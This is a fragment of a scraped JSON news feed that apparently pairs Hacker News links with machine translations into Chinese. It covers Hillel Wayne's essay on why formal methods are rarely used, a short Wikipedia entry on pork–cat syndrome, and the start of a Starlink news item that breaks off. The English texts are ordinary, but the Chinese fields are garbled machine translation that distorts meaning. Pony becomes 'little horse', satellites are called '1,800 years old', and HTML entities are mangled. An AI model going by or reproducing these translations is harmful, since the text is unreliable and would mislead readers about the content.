\u4f46\u662f\uff0c\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u6574\u4f53\u7684\u6b63\u5f0f\u65b9\u6cd5\u662f\u4e0d\u7ecf\u6d4e\u7684\u3002\u8bb8\u591a\u4e0a\u8ff0\u9ad8\u4fdd\u8bc1\u6280\u672f\u4f9d\u8d56\u4e8e\u5199\u4f5c\u4ee3\u7801\u89c4\u8303\uff0c\u60a8\u4e0d\u6b63\u5f0f\u8bc1\u660e\u3002\u81f3\u4e8e\u9a8c\u8bc1\uff0c\u6709\u4e24\u79cd\u5e38\u89c1\u7684\u65b9\u5f0f\u5728\u884c\u4e1a\u4e2d\u53d7\u76ca\u3002\u9996\u5148\u662f\u9a8c\u8bc1\u8bbe\u8ba1\u800c\u4e0d\u662f\u4ee3\u7801\uff0c\u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u4ecb\u7ecd\u3002\u7b2c\u4e8c\u4e2a\u662f\u90e8\u5206\u4ee3\u7801\u9a8c\u8bc1\uff0c\u6211\u4eec\u73b0\u5728\u5c06\u8986\u76d6\u3002\n  \u5728\u65e5\u5e38\u7f16\u7a0b\u4e2d\u8fdb\u884c\u5168\u9762\u9a8c\u8bc1\u771f\u7684\u592a\u8d35\u4e86\u3002\u90e8\u5206\u9a8c\u8bc1\u600e\u4e48\u6837\uff1f\u6211\u4ecd\u7136\u53ef\u4ee5\u4ece\u8bc1\u660e\u6211\u7684\u4ee3\u7801\u7684\u67d0\u4e9b\u90e8\u5206\u7684\u4e00\u4e9b\u5c5e\u6027\u3002\u800c\u4e0d\u662f\u8bc1\u660e\u6211\u7684\u6392\u5e8f\u51fd\u6570\u603b\u662f\u6392\u5e8f\uff0c\u800c\u662f\u81f3\u5c11\u8bc1\u660e\u5b83\u4e0d\u4f1a\u6c38\u8fdc\u5faa\u73af\uff0c\u800c\u4e14\u4ece\u672a\u5199\u51fa\u8fc7\u754c\u3002\u4f60\u4ecd\u7136\u53ef\u4ee5\u5f97\u5230\u5f88\u591a\u597d\u5904\u3002\u4f8b\u5982\uff0c\u751a\u81f3\u5199\u4f5c\u5173\u4e8eC\u7a0b\u5e8f\u7684\u57fa\u672c\u8bc1\u660e\u662f\u51cf\u5c11\u5927\u91cf\u672a\u5b9a\u4e49\u884c\u4e3a\u7684\u91cd\u8981\u65b9\u6cd5\u3002\n \u8fd9\u91cc\u7684\u9650\u5236\u662f\u53ef\u7528\u6027\u7684\u3002\u5927\u591a\u6570\u8bed\u8a00\u90fd\u8bbe\u8ba1\u7528\u4e8e\u5b8c\u5168\u9a8c\u8bc1\u6216\u65e0\u9a8c\u8bc1\u3002\u5728\u524d\u4e00\u4e2a\u6848\u4f8b\u4e2d\uff0c\u4f60\u4ee5\u66f4\u5177\u8868\u73b0\u529b\u7684\u8bed\u8a00\u7f3a\u5c11\u4e86\u5f88\u591a\u597d\u7684\u529f\u80fd\uff0c\u5728\u540e\u4e00\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u8bc1\u660e\u5728\u6982\u5ff5\u4e0a\u7684\u8bed\u8a00\u4e2d\u7684\u4e1c\u897f\u3002\u56e0\u6b64\uff0c\u5927\u591a\u6570\u5173\u4e8e\u90e8\u5206\u9a8c\u8bc1\u7684\u7814\u7a76\u4fa7\u91cd\u4e8e\u51e0\u79cd\u9ad8\u4f18\u5148\u7ea7\u8bed\u8a00\uff0c\u5982C\u548cJava\u3002\u60a8\u8fd8\u770b\u5230\u5f88\u591a\u4eba\u4f7f\u7528\u53d7\u9650\u5236\u7684\u8bed\u8a00\u5b50\u96c6\u3002\u4f8b\u5982\uff0cSpark\u662fADA\u7684\u53d7\u9650\u5b50\u96c6\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u5728Spark\u4e2d\u7f16\u5199\u5173\u952e\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u5176\u4e0e\u8f83\u5c11\u5173\u952e\u7684ADA\u4ee3\u7801\u4e92\u64cd\u4f5c\u3002\u4f46\u662f\u5927\u591a\u6570\u8bed\u8a00\u90fd\u662f\u6f02\u4eae\u7684\u5229\u57fa\u3002\n \u66f4\u5e38\u89c1\u7684\u662f\uff0c\u4eba\u4eec\u5c06\u7279\u5b9a\u7c7b\u578b\u7684\u9a8c\u8bc1\u7eb3\u5165\u8bed\u8a00\u7684\u6838\u5fc3\u7ed3\u6784\u3002\u751f\u4ea7\u7c7b\u578b\u7cfb\u7edf\u662f\u4e00\u79cd\u5e38\u89c1\u5f62\u5f0f\uff1a\u4f60\u53ef\u80fd\u4e0d\u77e5\u9053\u5c3e\u5df4\u603b\u662f\u8fd4\u56de\u5c3e\u5df4\uff0c\u4f46\u81f3\u5c11\u4f60\u77e5\u9053\u5b83\u6709[a]  - \uff06gt; [\u4e00\u79cd]\u3002\u60a8\u8fd8\u6709\u50cfRust\u8fd9\u6837\u7684\u6848\u4f8b\uff0c\u8bc1\u660e\u4e86\u5185\u5b58\u5b89\u5168\u548c\u5c0f\u9a6c\uff0c\u8bc1\u660e\u4e86\u5f02\u5e38\u5b89\u5168\u3002\u8fd9\u4e9b\u4e0eSpark\u548cFrama-C\u7565\u6709\u4e0d\u540c\uff0c\u56e0\u4e3a\u60a8\u53ea\u80fd\u8fdb\u884c\u90e8\u5206\u9a8c\u8bc1\uff0c\u800c\u4e0d\u662f\u4e00\u4e9b\u90e8\u5206\u548c\u4e00\u4e9b\u5b8c\u6574\u7684\u9a8c\u8bc1\u3002\u4ed6\u4eec\u8fd8\u503e\u5411\u4e8e\u901a\u8fc7\u7f16\u7a0b\u8bed\u8a00\u4e13\u5bb6\u901a\u8fc7\u6b63\u5f0f\u7684\u65b9\u6cd5\u4e13\u5bb6\uff0c\u4e24\u6761\u5b66\u79d1\u6709\u5f88\u591a\u91cd\u53e0\u4f46\u4e0d\u76f8\u540c\u3002\u8fd9\u53ef\u80fd\u662f\u4e3a\u4ec0\u4e48Rust\u548cHaskell\u8fd9\u6837\u7684\u8bed\u8a00\u5b9e\u9645\u4e0a\u662f\u53ef\u7528\u7684\u3002 \n\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u53ea\u8ba8\u8bba\u4e86\u4ee3\u7801\u9a8c\u8bc1\u3002 \u4e0d\u8fc7\uff0c\u6b63\u5f0f\u65b9\u6cd5\u8fd8\u6709\u53e6\u4e00\u9762\uff0c\u8fd9\u662f\u4e00\u6b65\u4e00\u6b65\u62bd\u8c61\uff0c\u5e76\u9a8c\u8bc1\u8bbe\u8ba1\u672c\u8eab\u3002 \u8fd9\u8db3\u4ee5\u8ba9\u5b83\u4e0e\u6b63\u5f0f\u89c4\u8303\u7684\u4ee3\u540d\u8bcd\uff1a\u5982\u679c\u6709\u4eba\u8bf4\u4ed6\u4eec\u505a\u6b63\u5f0f\u89c4\u8303\uff0c\u4ed6\u4eec\u53ef\u80fd\u610f\u5473\u7740\u4ed6\u4eec\u6307\u5b9a\u548c\u9a8c\u8bc1\u8bbe\u8ba1\u3002  \u6b63\u5982\u6211\u4eec\u6240\u8c08\u8bba\u7684\uff0c\u8bc1\u660e\u6bcf\u4e00\u884c\u4ee3\u7801\u662f\u771f\u5b9e\u7684  ...... ", "note_en": "I saw  this question on the Software Engineering Stack Exchange:  What are the barriers that prevent widespread adoption of formal methods? The question was closed as opinion-based, and most of the answers were things like \u201cits too expensive!!!\u201d or \u201cwebsite isn\u2019t airplane!!!\u201d These are sorta kinda true but don\u2019t explain very much. I wrote this to provide a larger historical picture of formal methods, why they\u2019re actually so unused, and what we\u2019re doing to make them used.\n Before we begin, we need to lay down some terms. There really isn\u2019t a formal methods community so much as a few tiny bands foraging in the Steppe.  This means different groups use terms in different ways. Very broadly, there are two domains in FM:  formal specification is the study of how we write precise, unambiguous specifications, and  formal verification is the study of how we prove things are correct. But \u201cthings\u201d includes both code and abstract systems. Not only do we use separate means of specifying both things, we often use different means to verify them, too. To make things even more confusing, if somebody says they do formal specification, they  usually mean they both specify and verify systems, and if somebody says they do formal verification, they  usually mean mean they both specify and verify code.\n For clarity purposes, I will divide verification into  code verification (CV) and  design verification (DV), and similarly divide specification into CS and DS. These are not terms used in the wider FM world. We\u2019ll start by talking about CS and CV, then move on to DS and DV.\n Additionally, we can do  partial verification, where we only verify a subset of the spec, or  full verification, where we verify the entire spec. This could be the difference between proving \u201cit never crashes or accepts the wrong password\u201d or \u201cit never crashes or admits the wrong password and locks the account if you give the wrong password three times.\u201d Most of this history will assume we\u2019re doing full verification.\n We should also clarify the type of software we\u2019re formalizing. Most people implicitly divide software into  high-assurance software, such as medical devices and aircraft, and everything else. People assume that formal methods are widely used in the former and unnecessary for the latter. This, if anything, is too  optimistic: most people in high-assurance software don\u2019t use formal methods. We\u2019ll focus instead on \u201cregular\u201d software.\n Finally, a disclaimer: I am not a historian, and while I tried to do my due diligence there are probably mistakes here. Also, I specialize in formal specification (DS and DV), so there are more likely to be mistakes in anything I say about code verification. If you see something wrong, email me and I\u2019ll fix it.  2\n   Before we prove our code is correct, we need to know what is \u201ccorrect\u201d. This means having some form of  specification, or spec, for what the code should do, one where we can unambiguously say whether a specific output follows the spec. Just saying a list is \u201csorted\u201d is unclear: we don\u2019t know what we\u2019re sorting, what criteria we\u2019re using, or even what we mean by \u201csort\u201d. Instead, we might say \u201cA list of integers  l is  sorted in ascending order if for any two indices i and j, if  i &lt; j, then  l[i] &lt;=  l[j]\u201d.\n  The first is writing them as statements independent of the code. We would write our sort function, and in a separate file write the theorem \u201cthis returns sorted lists\u201d. This is the oldest form of spec and is still the way Isabelle and ACL2 do things.  3\n The second embeds specs in the code in the form of pre/postconditions, assertions, and invariants. We might add a postcondition on the function that \u201cthe return value is a sorted list\u201d. Assertion-based specs were originally formalized as   Hoare Logic and were first integrated into a programming language with  Euclid in the early 1970s.  4 This style is also called  Design by Contract and is the most popular form of industrial verification.  5\n Finally, we have type systems. By  Curry-Howard correspondence, any math theorem or proof can be encoded as a dependent type. We\u2019d define the type of \u201csorted lists\u201d and declare our function has the type signature  [Int] -&gt; Sorted [Int].\n You can see examples of how all of these look at  Let\u2019s Prove Leftpad. HOL4 and Isabelle are good examples of \u201cindependent theorem\u201d specs, SPARK and Dafny have \u201cembedded assertion\u201d specs, and Coq and Agda have \u201cdependent type\u201d specs.  6\n If you squint a bit it looks like these three forms of code spec map to the three main domains of automated correctness checking: tests,  contracts, and types. This is not a coincidence. Correctness is a spectrum, and formal verification is one extreme of that spectrum. As we reduce the rigour (and effort) of our verification we get simpler and narrower checks, whether that means limiting the explored state space, using weaker types, or pushing verification to the runtime. Any means of total specification then becomes a means of partial specification, and vice versa: many consider   Cleanroom a formal verification technique, which primarily works by pushing code review far beyond what\u2019s humanly possible.\n  Verification proves code matches its spec. This raises a question: how do we know we have the right spec? Finding the right spec is one of the biggest challenges in formal methods. It\u2019s also one of the most raised objections, but the way skeptics mean it isn\u2019t  exactly the same as the way advocates think of it.\n When outsiders say \u201chow do you have the right spec?\u201d they\u2019re  usually thinking of  validation: showing a spec actually does what the client wants. If you formally prove your code sorts a list, but the customer actually wants Uber For Soups \u2122, you\u2019ve just wasted a bunch of time. Only by rapid iteration and short feedback cycles, people argue, can you actually validate your requirements.\n It is true that verifying code does not validate the code. There are two problems with this argument, though. The first is that it just delays the value of FM, not eliminate it entirely. Once you\u2019ve done your rapid iterations, you presumably have an idea of what your customer wants.  Then you start verifying code. Second, while we don\u2019t know what exactly the customer wants, there are some things we can assume they  don\u2019t want. They don\u2019t want the software randomly crashing on them. They don\u2019t want security holes. Everybody recognizes the importance of this: after all, nobody is saying you should skip unit tests while you iterate. So, at the very least, prove your version control system doesn\u2019t randomly delete chapters of a user\u2019s book.  7\n The problem with finding the right spec is more fundamental:  we often don\u2019t know what we want the spec to be. We think of our requirements in human terms, not mathematical terms. If I say \u201cthis should distinguish parks from birds\u201d, what am I  saying? I could explain to a human by giving a bunch of pictures of parks and birds, but that\u2019s just specific examples, not capturing the  idea of distinguishing parks from birds. To actually translate that to a formal spec requires us to be able to formalize human concepts, and that is a serious challenge.\n Don\u2019t get me wrong, it\u2019s possible to figure out the appropriate specs here and experts do it all of the time. But writing appropriate specs is a skill you need to develop, just as you needed to develop coding skills. This is why a lot of the more recent successes with code verification have been things with an obvious map between what we want and what we can express we want. For example,  CompCert is a formally verified C compiler. The spec there is \u201cthis will never miscompile\u201d.\n And none of this is the actual verification part. Once you  have a spec, you still need to prove the code  matches the spec.\n  The earliest means of code verification we see is the the Dijkstra-style \u201cthink really hard about why it\u2019s true\u201d method, which is basically what ALGOL was designed to help do. For example, I might \u201cprove\u201d an insertion sort works by arguing\n Base Case: if we have an empty list and add one element to it, that will be the only element, so it will be sorted.\n If we have a sorted list with  k elements and add one element, we insert the element so that it is after all smaller numbers and before all larger numbers. This means the list is still sorted.\n Obviously it\u2019d look more rigorous than that, but that\u2019s the general idea. Dijkstra and others used this style to prove a bunch of algorithms were correct, including many concurrency primitives. It\u2019s also the style that gives rise to the  Knuth quote \u201cBeware of bugs in the above code; I have only proved it correct, not tried it.\u201d It\u2019s pretty easy to screw up a math proof in a way nobody notices, and I\u2019ve read  estimates that something like 20% of published math proofs have errors in them.  Peter Guttmann has a great essay on how farcical code proofs got, where tons of \u201cproven\u201d code would immediately crash if run.\n At the same time we were exploring how to automatically prove mathematical theorems, the first such  theorem prover coming out in  1967. Researchers in the Pascal community were using theorem provers to verify programs by the  early 1970s, then programming in dedicated verification languages by mid-decade. People would write some properties of the code and then write a checkable proof that the code had those properties. Earlier theorem provers simply helped humans check and verify proofs while more sophisticated ones could prove parts of the theorem on their own.\n   Proofs are hard. Obnoxiously hard. \u201cQuit programming and join the circus\u201d hard. Surprisingly, formal code proofs are often  more rigorous than the proofs most mathematicians write! Mathematics is a very creative activity with a definite answer that\u2019s only valid if you show your work. Creativity, formalism, and computers are a bad combination.\n Take the above induction. Any mathematician could look at that and immediately know what induction is, how it works, and how it\u2019s valid in this case. These are all things we need to rigorously formalize in the theorem prover. Same with proof by contradiction, proof by contrapositive, etc. Along with this, we also need to formalize every assumption, even the stuff that most mathematicians don\u2019t bother to prove. For example, addition is associative:  a + (b + c) = (a + b) + c. The theorem prover doesn\u2019t a priori know that\u2019s true. You either have to prove it (hard), declare it an assumption the prover can take as true (dangerous), or buy a theorem library from someone who already proved it (expensive). Early proof assistants competed on the number of inbuilt proof tactics and bundled theorem libraries. One of the first widespread proof checkers, SPADE, advertised its complete arithmetic library as a key selling point.\n Next, you gotta actually get the proof. You can have the prover try to find it on its own, or write it yourself. In the general case, automatically infering a proof is undecidable. For extremely restricted cases, like propositional logic or HM type-checking, it\u2019s \u201conly\u201d NP-complete. For the most part we\u2019re stuck writing most of the proof ourselves and having the computer verify it\u2019s correct. That means you need a strong background in:\n The intricacies of the theorem prover you\u2019re using, which is a specialty unto itself\n To make things worse, computer properties throw a lot of wrenches into proofs. Remember how I said assuming addition was associative is dangerous? Some languages aren\u2019t associative. C++ has  INT_MAX.  ((-1) + INT_MAX) + 1 is  INT_MAX.  -1 + (INT_MAX + 1) is undefined. If you assume associative addition in C++, your proof will be wrong, and your code will be broken. You either have to avoid making that assertion, or prove that for your specific snippet, you never cause an overflow.\n Now you could say that undefined addition is a bug, and you should be using a language with unbound integers. But most languages have positive features that impede proofs. Take the following snippet:\n  Is that always true? Depends. Maybe  f modifies  a. Maybe another thread concurrency modifies  a. Maybe  b is aliased to  a, so modifying it also modifies  a.  8 If any of these are possible in your language, you have to explicitly prove they don\u2019t happen here. Purity helps in this case but can wreck proofs in other cases, as it forces you to use recursion and higher-order functions to get stuff done. Both of those, incidentally, are foundational to writing good functional programs. What\u2019s good for coding is bad for proving!  9\n Formal verifiers have a dilemma: the more expressive the language, the harder it is to prove anything in it. But the less expressive the language, the harder it is to  write anything in it. The first production verification languages were very restricted subsets of more expressive languages: ACL2 was a subset of Lisp, Euclid was a subset of Pascal, etc. And nothing we\u2019ve discussed so far gets into actually proving real-world programs, this is all just the table stakes to start writing proofs in the first place.\n Proofs are hard. They have, however, been getting better. Proof assistant researchers keep adding new heuristics, theorem libraries, preverified components, etc. Hardware improvements help, too: faster computers means faster searches.\n  These days the most population approach to proof automation is  SMT.  10 Speaking very broadly, an SMT solver can turn (some) theorems into constraint satisfaction problems. This turns a creative problem into a computational one. You may still need to feed it intermediate problems (lemmas) as steps in your theorem, but that\u2019s better than proving every damn thing yourself. Stanford released the first \u201cmodern\u201d SMT solver, the  Stanford Validity Checker, in 1998. They built on that to make CVC, released in 2002, which saw minor production use.   11\n The scene changed around 2006, when Microsoft Research released Z3. The big advantage of Z3 was it was a lot more user-friendly than other SMTs, which honestly wasn\u2019t saying much. MSR used it internally to help prove properties of the Windows kernel, meaning they invested more-than-the-bare-minimum in UX. Z3 arguably made SMT the default choice for general-purpose automated proving. Many tools in CV now rely on SMT, and most of those come with Z3 by default.\n Accessible SMT solving was a kick in the pants to the formal verification community, as it makes a lot of simple proofs trivial and nasty proofs tractable. This, in turn, meant people could start proving things in more expressive languages, as they now had the power to tackle the challenges of expressive statements. The incredible progress here is evident in the  IronFleet project: by using advanced SMT solvers and a cutting-edge verification language, Microsoft was able to write 5,000 lines of verified Dafny code in only 3.7 person-years! That\u2019s a blazing-fast rate of  four whole lines a day.   12\n   Now would be a good time to step back and ask \u201cwhat\u2019s the point?\u201d We\u2019re trying to prove some program conforms to some spec. Correctness is a spectrum. There are two parts of the verification question: how objectively \u201ccorrect\u201d your program is, and how much you\u2019ve rigorously verified the correctness. Obviously, more verified is better than less verified, but verification costs time and money. If we have multiple constraints to optimize (performance, time to market, cost, etc), the optimium isn\u2019t necessarily \u201cfully proved correct\u201d. Then the question becomes \u201cwhat\u2019s the minimal verification we need\u201d and \u201chow much does it cost to get there.\u201d In  most cases you can get away with, like, 90% or 95% or 99% correct. You may be better off spending time making the UX better than getting that last 1% of correctness.\n The question, then: \u201cis 90/95/99% correct significantly cheaper than 100% correct?\u201d The answer is very yes. We all are comfortable saying that a codebase we\u2019ve well-tested and well-typed is  mostly correct modulo a few fixes in prod, and we\u2019re even writing more than four lines of code a day. In fact,  the vast majority of distributed systems outages could have been prevented by slightly-more-comprehensive testing. And that\u2019s just more comprehensive unit testing, to say nothing of fuzzing, property-based testing, or model-testing. You can get really far with simpler tricks without needing to go on to full proofs.\n What if types\u2019n\u2019tests isn\u2019t getting you enough verification? It\u2019s still much easier to go from 90% to 99% than from 99% to 100%. As mentioned earlier, Cleanroom is a developer practice involving comprehensive documentation, careful flow analysis, and extensive code review. No proofs, no formal verification, not even any unit testing. But done properly, Cleanroom reduces the defect density to less than 1 bug/kLoC in production.  13 Teams using it have equal or shorter delivery times than teams that don\u2019t use it- certainly better than 4 lines a day. And Cleanroom itself is just one of many high-assurance techniques that sit between mainstream software practices and code verification. You do not need full code verification to write good software or even to write near-perfect software. There are cases where it\u2019s necessary, but for most of the industry it\u2019s a waste of money.\n However, that does not mean formal methods as a whole is uneconomical. Many aforementioned high-assurance techniques rely on writing code specs that you don\u2019t formally prove. As for verification, there are two common ways people benefit from it in the industry. The first is verifying designs instead of code, which we will cover in the next section. The second is  partial code verification, which we will cover right now.\n  It\u2019s too expensive doing full verification in day-to-day programming. What about partial verification? I could still benefit from proving some properties of some parts of my code. Instead of proving that my sort function always sorts, I can at least prove it doesn\u2019t loop forever and never writes out of bounds. You can still get a lot of benefit out of this. For example, writing even basic proofs about C programs is a great way to  cut out huge amounts of undefined behavior.\n The limitation here is  availability. Most languages are designed for either full verification or no verification. In the former case, you\u2019re missing a lot of nice features in more expressive languages, and in the latter case you a need a way to prove stuff in a language hostile to the concept. For this reason, most of the research on partial verification focuses on a few high-priority languages, like  C and Java. You also see a lot of people working with restricted subsets of languages. For example, SPARK is a restricted subset of Ada, so you can write critical stuff in SPARK and have it interop with less-critical Ada code. But most languages like that are pretty niche.\n More commonly, people bake specific kinds of verification into the the core structure of languages. Production type systems are a common form of this: you may not know that  tail always returns the tail, but at  least you know that it has type  [a] -&gt; [a]. You also have cases like Rust, which proves memory safety, and Pony, which proves exception safety. These are slightly different from SPARK and Frama-C in that you can  only do partial verification, not some partial and some full verification. They also tend to be made by programming language experts over formal methods experts, two disciplines that have a lot of overlap but aren\u2019t identical. This might be why languages like Rust and Haskell are actually-kinda-usable in practice.\n  So far we\u2019ve only talked about code verification. There\u2019s another side to formal methods, though, which is going one step more abstract and verifying the designs themselves. This is deep enough that it\u2019s synonymous with  formal specification: if somebody says they do formal specification, they probably mean they specify and verify designs.\n As we talked about, proving every line of code is real\n......", "posttime": "2021-06-22 16:43:07", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "people,\u9a8c\u8bc1", "title": "\u4eba\u4eec\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528\u6b63\u5f0f\u65b9\u6cd5\uff1f -  2019\u5e74 ", "title_en": "Why Don't People Use Formal Methods? \u2013 2019", "transed": 1, "url": "https://www.hillelwayne.com/post/why-dont-people-use-formal-methods/", "via": "", "real_tags": ["people", "\u9a8c\u8bc1"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067392, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8df3\u8f6c\u5230\u5bfc\u822a\u8df3\u8dc3\u4ee5\u641c\u7d22\u732a\u8089\u7efc\u5408\u75c7\u662f\u732a\u8089\u7684\u8fc7\u654f\uff0c\u901a\u5e38\u5728\u9752\u6625\u671f\u540e\uff0c\u8fd9\u662f\u7531\u66b4\u9732\u5728\u732b\u5f15\u8d77\u7684\u3002\u867d\u71361994\u5e74\u9996\u6b21\u63cf\u8ff0\uff0c\u4f46[1] [2] [3]\u9996\u5148\u5728\u7f8e\u56fd\u65af\u79d1\u7279\u59d4\u5458\u4f1a\u548c\u6258\u9a6c\u65af\u666e\u62c9\u65af\u5382\u5728alpha-gal\u8fc7\u654f\u7684\u7814\u7a76\u671f\u95f4\u9996\u6b21\u8bb0\u5f55\u5728\u7f8e\u56fd\u3002 [4]\n \u5b83\u88ab\u79f0\u4e3a\uff0334;\u732a\u8089\u7efc\u5408\u75c7\uff06\uff0334;\u56e0\u4e3a\uff06\uff0334;\u51e0\u4e4e\u6240\u6709\u6761\u4ef6\u7684\u4eba\u90fd\u662f\u732b\u4e3b\u4eba\uff0c\u8bb8\u591a\u4eba\u90fd\u6709\u591a\u53ea\u732b\u3002\u4e00\u4e9b\u5bf9\u732b\u8840\u6e05\u767d\u86cb\u767d\uff08\u732b\u809d\u810f\u86cb\u767d\u8d28\u5236\u6210\u7684\u86cb\u767d\u8d28\uff09\u4ea7\u751f\u8fc7\u654f\u53cd\u5e94\uff0c\u5f53\u6709\u4eba\u6d88\u8017\u5b83\u65f6\uff0c\u5728\u732a\u8089\u4e2d\u4e0e\u767d\u86cb\u767d\u4ea4\u53c9\u53cd\u5e94\uff0c\u5e76\u4e14\u5f53\u732a\u8089\u6d88\u8017\u65f6\u53ef\u80fd\u5bfc\u81f4\u4e25\u91cd\u751a\u81f3\u81f4\u547d\u7684\u8fc7\u654f\u53cd\u5e94\u3002\uff06\uff0334; [4]\n  ^ abreu\uff0c\u5361\u5c14\u83ab;\u6208\u9ea6\u65af\uff0c\u62c9\u594e\u5c14; Bartolome Borja\uff0cBial-Ar\u00edstegui;\u5f17\u62c9\u7eb3\uff0c\u6d77\u4f26\u5a1c; Cunha\uff0cLeonor\uff082015\u5e743\u670830\u65e5\uff09\u3002 \uff06\uff0334;\u732a\u8089\u7efc\u5408\u75c7\uff1f\uff06\uff0334;\u3002\u4e34\u5e8a\u7ffb\u8bd1\u8fc7\u654f\u3002 5\uff083\uff09\uff1aP164\u3002 DOI\uff1a10.1186 / 2045-7022-5-S3-P164\u3002 PMC 4412402\u3002\n  ^ posthumus\uff0c\u4e54\u7eb3\u68ee;\u8a79\u59c6\u65af\uff0c\u6d77\u8389\u00b7\u5df7\uff0c\u67e5\u5c14\u65afj;\u9a6c\u6258\u65af\uff0c\u8def\u6613\u65af;\u666e\u62c9\u65af\u5382\uff0c\u6258\u9a6c\u65afA e; Commins\uff0cScott P\uff082017\u5e743\u670824\u65e5\uff09\u3002 \uff06\uff0334;\u7f8e\u56fd\u732a\u8089\u7efc\u5408\u75c7\u7684\u521d\u59cb\u63cf\u8ff0\u3002 j alerergy inlmunol\u3002 131\uff083\uff09\uff1a923-925\u3002 DOI\uff1a10.1016 / J.Jaci.2012.12.665\u3002 PMC 3594363.PMID 23352634\u3002 ", "note_en": "Jump to navigation  Jump to search  Pork\u2013cat syndrome is an  allergy to  pork, usually after  adolescence, that is caused by exposure to  cats. Although first described in 1994,  [1]  [2]  [3] it was first documented in the U.S. by Scott Commins and  Thomas Platts-Mills during their research on  alpha-gal allergy.  [4]\n It is called &#34;pork\u2013cat syndrome&#34; because &#34;almost all people with the condition are cat owners, and many have multiple cats. Some develop an allergic response to cat  serum albumin (protein made by a cat\u2019s  liver) that cross-reacts with albumin in pork when someone consumes it, and can lead to severe or even fatal allergic reactions when pork is consumed.&#34;  [4]\n  ^   Abreu, Carmo; Gomes, Raquel; Bartolome Borja, Bial-Ar\u00edstegui; Falc\u00e3o, Helena; Cunha, Leonor (30 March 2015).  &#34;Pork-cat syndrome?&#34;.  Clin Transl Allergy.  5 (Suppl 3): P164.  doi: 10.1186/2045-7022-5-S3-P164.  PMC\u00a0  4412402.\n  ^    Posthumus, Jonathon; James, Hayley R; Lane, Charles J; Matos, Luis A; Platts-Mills, Thomas A E; Commins, Scott P (24 March 2017).  &#34;Initial Description of Pork-Cat Syndrome in the United States&#34;.  J Allergy Clin Immunol.  131 (3): 923\u2013925.  doi: 10.1016/j.jaci.2012.12.665.  PMC\u00a0  3594363.  PMID\u00a0 23352634.", "posttime": "2021-06-22 16:42:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u732a\u8089,cat", "title": "\u732a\u8089\u7efc\u5408\u75c7 ", "title_en": "Pork-Cat Syndrome", "transed": 1, "url": "https://en.wikipedia.org/wiki/Pork%E2%80%93cat_syndrome", "via": "", "real_tags": ["\u732a\u8089", "cat"]}, {"category": "", "categoryclass": "", "imagename": "08bf2195efba9e9b0f57154145ce93e9.jpg", "infoid": 1067391, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6089\u5c3c\uff1aStarlink\uff0cElon Musk\u7684\u536b\u661f\u4e92\u8054\u7f51\u5355\u5143\u548c\uff0339; S Spacex\uff0c\u9884\u8ba1\u5c06\u80fd\u591f\u5728\u4e5d\u6708\u5de6\u53f3\u63d0\u4f9b\u6301\u7eed\u7684\u5168\u7403\u8986\u76d6\uff0c\u4f46\u968f\u540e\u9700\u8981\u5bfb\u6c42\u76d1\u7ba1\u5ba1\u6279\uff0c\u5176\u603b\u7edfGwynne Shotwel\u5468\u4e8c\u8868\u793a\u3002\n \uff06\uff0334;\u6211\u4eec\u6210\u529f\u90e8\u7f72\u4e861,800\u5c81\u5de6\u53f3\u7684\u536b\u661f\uff0c\u5e76\u4e00\u65e6\u6240\u6709\u8fd9\u4e9b\u536b\u661f\u5230\u8fbe\u4ed6\u4eec\u7684\u8fd0\u8425\u8f68\u9053\uff0c\u6211\u4eec\u5c06\u5177\u6709\u6301\u7eed\u7684\u5168\u7403\u8986\u76d6\u8303\u56f4\uff0c\u56e0\u6b64\u5e94\u8be5\u50cf9\u6708\u7684\u65f6\u95f4\u8303\u56f4\u4e00\u6837\uff0c\uff06\uff0334;\u5979\u901a\u8fc7\u7f51\u7edc\u5e7f\u64ad\u544a\u8bc9\u4e86\u9ea6\u53e4\u7ef4\u96c6\u56e2\u6280\u672f\u4f1a\u8bae\u3002\n     \uff06\uff0334;\u4f46\u968f\u540e\u6211\u4eec\u6709\u76d1\u7ba1\u5de5\u4f5c\u8fdb\u5165\u6bcf\u4e2a\u56fd\u5bb6\u5e76\u83b7\u5f97\u6279\u51c6\u63d0\u4f9b\u7535\u4fe1\u670d\u52a1\u3002\uff06\uff0334;\n Shotwel\u8868\u793a\uff0cStarlink\u8ba1\u5212\u8ba1\u5212\u90e8\u7f7212,000\u9897\u536b\u661f\uff0c\u603b\u8ba1\u7ea6\u4e3a100\u4ebf\u7f8e\u5143\u7684\u8d39\u7528\uff0c\u76ee\u524d\u572811\u4e2a\u56fd\u5bb6\u63d0\u4f9bBeta\u670d\u52a1\u3002\n 5\u6708\uff0cMusk\u8868\u793a\uff0c\u4f4e\u5730\u8f68\u9053\u536b\u661f\u7f51\u7edc\u5df2\u6536\u5230\u8d85\u8fc7500,000\u4eba\u7684\u4e92\u8054\u7f51\u670d\u52a1\u9884\u8ba2\uff0c\u5e76\u9884\u8ba1\u4e0d\u4f1a\u6ee1\u8db3\u9700\u6c42\u7684\u6280\u672f\u95ee\u9898\u3002\n \u4eca\u5e74\u7f8e\u56fd\u8054\u90a6\u901a\u4fe1\u59d4\u5458\u4f1a\u6279\u51c6\u4e86Spacex\uff06\uff0339;\u8ba1\u5212\u5728\u8f83\u4f4e\u5730\u7403\u8f68\u9053\u4e0a\u90e8\u7f72\u4e00\u4e9bStarlink\u536b\u661f\uff0c\u800c\u4e0d\u662f\u8ba1\u5212\u4e3a\u76ee\u524d\u7f3a\u4e4f\u8bbf\u95ee\u7684\u4eba\u63d0\u4f9b\u9ad8\u901f\u5bbd\u5e26\u4e92\u8054\u7f51\u670d\u52a1\u3002\n     